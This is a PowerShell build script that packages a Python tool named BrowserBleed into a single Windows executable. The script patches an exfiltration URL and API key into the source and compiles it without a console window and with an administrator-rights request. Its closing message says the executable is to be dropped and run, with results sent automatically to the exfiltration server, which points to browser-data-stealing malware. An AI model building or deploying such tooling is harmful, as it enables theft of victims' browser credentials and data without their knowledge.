# build_windows.ps1 — builds BrowserBleed.exe with the report server URL and key baked in.
# Run from the repo root in PowerShell (no arguments needed if deploy/config is populated):
#   .\build_windows.ps1
#
# To override the server URL or key:
#   .\build_windows.ps1 -ExfilUrl https://reports.example.com -ExfilKey mykey

param(
    [string]$ExfilUrl = "",
    [string]$ExfilKey = ""
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# ── Load deploy/config if values not passed in ────────────────────────────────
if (-not $ExfilUrl -or -not $ExfilKey) {
    $configPath = Join-Path $PSScriptRoot "deploy\config"
    if (Test-Path $configPath) {
        foreach ($line in Get-Content $configPath) {
            if ($line -match '^DOMAIN=(.+)$'    -and -not $ExfilUrl) { $ExfilUrl = "https://$($Matches[1])" }
            if ($line -match '^BB_API_KEY=(.+)$' -and -not $ExfilKey) { $ExfilKey = $Matches[1].Trim() }
        }
    }
}

if (-not $ExfilUrl) { Write-Error "ExfilUrl not set — add DOMAIN to deploy/config or pass -ExfilUrl"; exit 1 }
if (-not $ExfilKey) { Write-Error "ExfilKey not set — add BB_API_KEY to deploy/config or pass -ExfilKey"; exit 1 }

Write-Host "[*] Building BrowserBleed.exe"
Write-Host "    Exfil URL: $ExfilUrl"
Write-Host "    Exfil key: $($ExfilKey.Substring(0,4))****"

# ── Patch a temp copy of the source ──────────────────────────────────────────
$src     = Join-Path $PSScriptRoot "BrowserBleed.py"
$tmpSrc  = Join-Path $env:TEMP "BrowserBleed_build.py"

(Get-Content $src -Raw) `
    -replace '_EXFIL_URL: str = ""', "_EXFIL_URL: str = `"$ExfilUrl`"" `
    -replace '_EXFIL_KEY: str = ""', "_EXFIL_KEY: str = `"$ExfilKey`"" |
    Set-Content -Path $tmpSrc -Encoding utf8

# ── Build ─────────────────────────────────────────────────────────────────────
$buildTmp = Join-Path $env:TEMP "bb_build"
python -m PyInstaller `
    --onefile --noconsole --uac-admin `
    --name BrowserBleed `
    --distpath $PSScriptRoot `
    --workpath $buildTmp `
    --specpath $buildTmp `
    $tmpSrc

Remove-Item $tmpSrc -Force -ErrorAction SilentlyContinue
Remove-Item $buildTmp -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "[+] Done: $PSScriptRoot\BrowserBleed.exe"
Write-Host "    Drop and run - results auto-exfil to $ExfilUrl"
